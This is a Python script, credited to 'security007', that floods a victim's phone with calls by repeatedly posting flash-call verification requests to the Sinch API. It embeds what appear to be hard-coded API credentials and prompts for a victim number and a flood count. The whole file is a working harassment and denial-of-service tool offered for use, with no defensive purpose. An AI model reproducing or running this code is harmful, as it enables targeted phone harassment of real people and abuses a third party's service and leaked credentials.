#!/usr/bin/python
import requests
import json
import base64
from time import sleep,asctime
import sys
import random

class warna :
	HIJAU = '\033[92m'
	KUNING = '\033[33m'
	MERAH = '\033[31m'
	BIRU = '\033[36m'
	BTUA = '\033[34m'
	UNGU = '\033[35m'
	PINK = '\033[91m'
	CR = '\033[93m'
	TUTUP = '\033[00m'

hijau = warna.HIJAU
biru = warna.BIRU
kuning = warna.KUNING
merah = warna.MERAH
btua = warna.BTUA
ungu = warna.UNGU
pink = warna.PINK
cr = warna.CR
tutup = warna.TUTUP

banner = merah+"""
                  ___ ___    .-.   ___                     ___                   
                 (   |   )  /    \(   )                   (   )                  
  .--.     .---.  | | | |   | .`. ;| |  .--.    .--.    .-.| |  .--.  ___ .-.    
 /    \   / .-, \ | | | |   | |(___) | /    \  /    \  /   \ | /    \(   )   \   
|  .-. ; (__) ; | | | | |   | |_   | ||  .-. ;|  .-. ;|  .-. ||  .-. ;| ' .-. ;  
|  |(___)  .'`  | | | | |  (   __) | || |  | || |  | || |  | ||  | | ||  / (___) 
|  |      / .'| | | | | |   | |    | || |  | || |  | || |  | ||  |/  || |        
|  | ___ | /  | | | | | |   | |    | || |  | || |  | || |  | ||  ' _.'| |        
|  '(   ); |  ; | | | | |   | |    | || '  | || '  | || '  | ||  .'.-.| |        
'  `-' | ' `-'  | | | | |   | |    | |'  `-' /'  `-' /' `-'  /'  `-' /| |        
 `.__,'  `.__.'_.(___|___) (___)  (___)`.__.'  `.__.'  `.__,'  `.__.'(___)       
                                                                                 
"""+tutup+biru+"""Coded by security007
Contact : defacementsec007@gmail.com
Copyright © 2019								  

 """+tutup
																				 
print(banner)
def flood(num,flood):
	url = "https://verificationapi-v1.sinch.com/verification/v1/verifications"
	head = {'content-type': 'application/json; charset=UTF-8'}
	for x in range(flood):
		botnum = random.randrange(500,90000)
		botname = "bot_"+str(botnum)
		animation = "-\|/-\|/"
		randwait = random.randrange(10,20)
		line = "-"*30
		dat = {"identity": {"type": "number","endpoint": num},"custom": "security007","reference": botname,"method": "flashCall","metadata": {"os": "rest","platform": "N/A"}}
		if (x != "0"):
			a = requests.post(url,headers=head,data=json.dumps(dat),auth=('95976edc-a382-4af0-9ab3-81ca5ca1ee69','RKF/OtDzBUG1fMkJE4jSKQ=='))
			b = a.json()
			print(line+"["+hijau+asctime()+tutup+"]"+line)
			print("["+hijau+botname+tutup+"] "+"Is Calling...")
			try:
				print("["+kuning+"Connected"+tutup+"] Call Id : "+b['flashCall']['callId'])
			except KeyError:
				print("["+merah+"Failed"+tutup+"] API Error, Contact me : defacementsec007@gmail.com")
				sys.exit()
			for i in range(randwait):
				randwarna = random.choice([merah,kuning,btua,biru,cr,pink,ungu,hijau])
				sleep(0.5)
				sys.stdout.write("\r["+randwarna+"Ringing"+tutup+"] Victim phone is ringing "+ animation[i % len(animation)])
				sys.stdout.flush()
			print("\n"+line+"["+hijau+"security007 call flooder"+tutup+"]"+line+"\n\n")
		else:
			print("["+hijau+tm+tutup+"] Finished...")

def main():
	try:
		nomor = input("Victim Phone Number [example: +628123456789 ] : ")
		if (nomor.startswith("+") == True):
			pass
		else:
			print("["+merah+"Error"+tutup+"] Format number error")
			main()
		fl = int(input("Flood Count : "))
	except ValueError:
		print("["+merah+"Error"+tutup+"] Only input number in 'flood count' ")
		main()
	except KeyboardInterrupt:
		print("\n["+merah+"Exit"+tutup+"] Bye...")
		sys.exit()
	try:
		flood(nomor,fl)
	except KeyboardInterrupt:
		print("\n["+merah+"Exit"+tutup+"] Bye...")
		sys.exit()
	
if (__name__ == "__main__"):
	main()
